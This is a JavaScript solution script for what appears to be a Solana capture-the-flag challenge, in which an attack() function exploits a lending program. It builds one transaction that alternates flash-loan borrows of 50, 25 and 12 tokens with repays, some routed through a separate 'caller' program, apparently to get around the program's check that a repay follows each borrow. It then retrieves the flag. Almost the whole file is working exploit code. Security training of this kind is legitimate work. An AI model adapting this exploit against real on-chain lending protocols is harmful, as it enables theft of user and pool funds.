import * as fs from "fs";
import * as anchor from "@project-serum/anchor";
import { BN } from "bn.js";

import * as api from "./api.js"; 
import { sleep, parseAccounts, sendInstructions } from "./util.js";

import * as spl_token from "@solana/spl-token";
import { TOKEN_PROGRAM_ID } from "@solana/spl-token";
import { PublicKey, SYSVAR_INSTRUCTIONS_PUBKEY } from "@solana/web3.js";

const idl = JSON.parse(fs.readFileSync("../idl/challenge3.json"));
const accountFile = parseAccounts(fs.readFileSync("../" + api.PLAYERFILE));
const player = accountFile.player;
const accounts = accountFile.challengeThree;
const program = new anchor.Program(idl, accounts.programId.toString(), "fake truthy value");
const baseUrl = accountFile.endpoint.match(/^(https*:\/\/[^\/]+)\/.*/)[1];
const conn = new anchor.web3.Connection(accountFile.endpoint);

// all player code goes here
async function attack() {

    console.log(accounts);

    // pool balance
    let poolAccount = await spl_token.getAccount(conn, accounts.poolAccount);
    console.log(`Pool amount: ${poolAccount.amount}`);

    // player token account
    let playerTokenAccount = await spl_token.getAccount(conn, await spl_token.getAssociatedTokenAddress(accounts.atomcoinMint, player.publicKey));
    console.log(`Player amount: ${playerTokenAccount.amount}`);
    
    // caller program
    const callerProgramId = "3dxs6HNWYRGW3LTQygqJaJDYhbGEfA8NR1HKEbpi6rZ6";
    const callerIdl = JSON.parse(fs.readFileSync("../chain/target/idl/caller.json"));
    const callerProgram = new anchor.Program(callerIdl, callerProgramId, "caller program");
    // console.log(callerProgram);

    // list storing all the txns
    const txn = new anchor.web3.Transaction();

    // borrowing 50 
    txn.add(program.instruction.borrow(new BN(50), {
        accounts: {
            player: player.publicKey,
            user: player.publicKey,
            state: accounts.state,
            pool: accounts.pool,
            poolAccount: accounts.poolAccount,
            depositorAccount: playerTokenAccount.address,
            instructions: SYSVAR_INSTRUCTIONS_PUBKEY,
            tokenProgram: TOKEN_PROGRAM_ID
        }
    }));

    // call to repay instruction via our caller program
    txn.add(callerProgram.instruction.callRepay({
        accounts: {
            chall3: accounts.programId,
            player: player.publicKey,
            user: player.publicKey,
            state: accounts.state,
            pool: accounts.pool,
            poolAccount: accounts.poolAccount,
            depositorAccount: playerTokenAccount.address,
            tokenProgram: TOKEN_PROGRAM_ID,
        }
    }));

    // borrowing 50
    txn.add(program.instruction.borrow(new BN(50), {
        accounts: {
            player: player.publicKey,
            user: player.publicKey,
            state: accounts.state,
            pool: accounts.pool,
            poolAccount: accounts.poolAccount,
            depositorAccount: playerTokenAccount.address,
            instructions: SYSVAR_INSTRUCTIONS_PUBKEY,
            tokenProgram: TOKEN_PROGRAM_ID
        }
    }));

    // repay 50
    txn.add(program.instruction.repay(new BN(50), {
        accounts: {
            chall3: program._programId,
            player: player.publicKey,
            user: player.publicKey,
            state: accounts.state,
            pool: accounts.pool,
            poolAccount: accounts.poolAccount,
            depositorAccount: playerTokenAccount.address,
            tokenProgram: TOKEN_PROGRAM_ID
        }
    }));

    // borrowing 25 
    txn.add(program.instruction.borrow(new BN(25), {
        accounts: {
            player: player.publicKey,
            user: player.publicKey,
            state: accounts.state,
            pool: accounts.pool,
            poolAccount: accounts.poolAccount,
            depositorAccount: playerTokenAccount.address,
            instructions: SYSVAR_INSTRUCTIONS_PUBKEY,
            tokenProgram: TOKEN_PROGRAM_ID
        }
    }));

    // call to repay instruction via our caller program
    txn.add(callerProgram.instruction.callRepay({
        accounts: {
            chall3: accounts.programId,
            player: player.publicKey,
            user: player.publicKey,
            state: accounts.state,
            pool: accounts.pool,
            poolAccount: accounts.poolAccount,
            depositorAccount: playerTokenAccount.address,
            tokenProgram: TOKEN_PROGRAM_ID,
        }
    }));

    // borrowing 25
    txn.add(program.instruction.borrow(new BN(25), {
        accounts: {
            player: player.publicKey,
            user: player.publicKey,
            state: accounts.state,
            pool: accounts.pool,
            poolAccount: accounts.poolAccount,
            depositorAccount: playerTokenAccount.address,
            instructions: SYSVAR_INSTRUCTIONS_PUBKEY,
            tokenProgram: TOKEN_PROGRAM_ID
        }
    }));

    // repay 25
    txn.add(program.instruction.repay(new BN(25), {
        accounts: {
            chall3: program._programId,
            player: player.publicKey,
            user: player.publicKey,
            state: accounts.state,
            pool: accounts.pool,
            poolAccount: accounts.poolAccount,
            depositorAccount: playerTokenAccount.address,
            tokenProgram: TOKEN_PROGRAM_ID
        }
    }));


    // borrowing 12 
    txn.add(program.instruction.borrow(new BN(12), {
        accounts: {
            player: player.publicKey,
            user: player.publicKey,
            state: accounts.state,
            pool: accounts.pool,
            poolAccount: accounts.poolAccount,
            depositorAccount: playerTokenAccount.address,
            instructions: SYSVAR_INSTRUCTIONS_PUBKEY,
            tokenProgram: TOKEN_PROGRAM_ID
        }
    }));

    // call to repay instruction via our caller program
    txn.add(callerProgram.instruction.callRepay({
        accounts: {
            chall3: accounts.programId,
            player: player.publicKey,
            user: player.publicKey,
            state: accounts.state,
            pool: accounts.pool,
            poolAccount: accounts.poolAccount,
            depositorAccount: playerTokenAccount.address,
            tokenProgram: TOKEN_PROGRAM_ID,
        }
    }));

    // borrowing 12
    txn.add(program.instruction.borrow(new BN(12), {
        accounts: {
            player: player.publicKey,
            user: player.publicKey,
            state: accounts.state,
            pool: accounts.pool,
            poolAccount: accounts.poolAccount,
            depositorAccount: playerTokenAccount.address,
            instructions: SYSVAR_INSTRUCTIONS_PUBKEY,
            tokenProgram: TOKEN_PROGRAM_ID
        }
    }));

    // repay 12
    txn.add(program.instruction.repay(new BN(12), {
        accounts: {
            chall3: program._programId,
            player: player.publicKey,
            user: player.publicKey,
            state: accounts.state,
            pool: accounts.pool,
            poolAccount: accounts.poolAccount,
            depositorAccount: playerTokenAccount.address,
            tokenProgram: TOKEN_PROGRAM_ID
        }
    }));

     
    const sign = await anchor.web3.sendAndConfirmTransaction(conn, txn, [player]);
    console.log("Signature: "+ sign);


    // pool balance
    poolAccount = await spl_token.getAccount(conn, accounts.poolAccount);
    console.log(`Pool amount: ${poolAccount.amount}`);

    // player token account
    playerTokenAccount = playerTokenAccount = await spl_token.getAccount(conn, await spl_token.getAssociatedTokenAddress(accounts.atomcoinMint, player.publicKey));
    console.log(`Player amount: ${playerTokenAccount.amount}`);


}

console.log("running attack code...");
await attack();

console.log("checking win...");
const flag = await api.getFlag(baseUrl, player.publicKey, 3);

if(flag) {
    console.log("win! your flag is:", flag);
}
else {
    console.log("no win");
}
